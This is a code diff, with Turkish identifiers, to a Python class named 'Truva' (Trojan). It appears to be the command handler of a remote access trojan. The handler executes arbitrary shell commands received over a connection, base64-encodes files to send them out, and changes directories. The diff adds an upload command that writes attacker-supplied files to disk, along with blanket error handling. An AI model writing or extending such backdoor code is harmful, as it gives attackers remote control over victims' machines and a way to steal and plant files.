@@ -13,17 +13,24 @@ class Truva:
 
 
     def komut_isleme(self,komut):
-        if komut[0]=="çıkış":
-            self.baglanti.close()
-            exit()
-        elif komut[0]=="cd" and len(komut)>1:
-            os.chdir(komut[1])
-            return komut[1] + " ulaşıldı."
-        elif komut[0]=="indir":
-            with open(komut[1],"rb") as dosya:
-                return base64.b64encode(dosya.read())
-        else:
-            return subprocess.check_output(komut, shell=True)
+        try:
+            if komut[0]=="çıkış":
+                self.baglanti.close()
+                exit()
+            elif komut[0]=="cd" and len(komut)>1:
+                os.chdir(komut[1])
+                return komut[1] + " ulaşıldı."
+            elif komut[0]=="indir":
+                with open(komut[1],"rb") as dosya:
+                    return base64.b64encode(dosya.read())
+            elif komut[0]=="yükle":
+                with open(komut[1],"wb") as dosya1:
+                    dosya1.write(base64.b64decode(komut[2]))
+                    return komut[1] + " Yüklendi."
+            else:
+                return subprocess.check_output(komut, shell=True)
+        except Exception:
+            return "Hata!"
 
     def paketleme(self,veri):
         paket = simplejson.dumps(veri)
